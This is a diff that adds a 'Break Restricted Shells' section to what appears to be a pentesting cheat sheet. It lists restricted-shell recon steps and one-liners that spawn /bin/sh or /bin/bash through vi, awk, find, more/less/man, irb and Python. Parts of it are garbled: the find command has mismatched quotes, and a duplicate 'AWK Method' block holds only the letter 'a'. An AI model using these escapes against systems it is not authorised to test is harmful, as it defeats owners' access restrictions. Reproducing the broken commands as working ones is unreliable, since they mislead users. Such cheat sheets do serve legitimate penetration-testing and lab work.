@@ -855,4 +855,46 @@ python -m SimpleHTTPServer 8000
 ```
 echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
 ```
+## Break Restricted Shells
+```
+Recon of restricted shells: "env" command to see what the restricted shell path is
+then echo /usr/local/rbin/* or ls -al /usr/local/rbin/*
+once paths are listed, research each one to see options
+export -p shows which variables are read only
+```
+## (VI or VIM Method)
+```
+Open a file and enter the following
+:set shell=/bin/bash
+:shell
+or
+:! /bin/bash
+```
+## (AWK Method)
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+## (Find Method)
+```
+find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+## (More/Less/Man Method)
+```
+Type more, less, or man command with a file then try one of the following:
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+```
+## (AWK Method)
+```
+a
+```
+## (Other Methods)
+```
+irb(main:001:0> exec "/bin/sh"
+python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+also try the shell spawning methods above
+```
+
+
 ## How to replicate to gain access again:
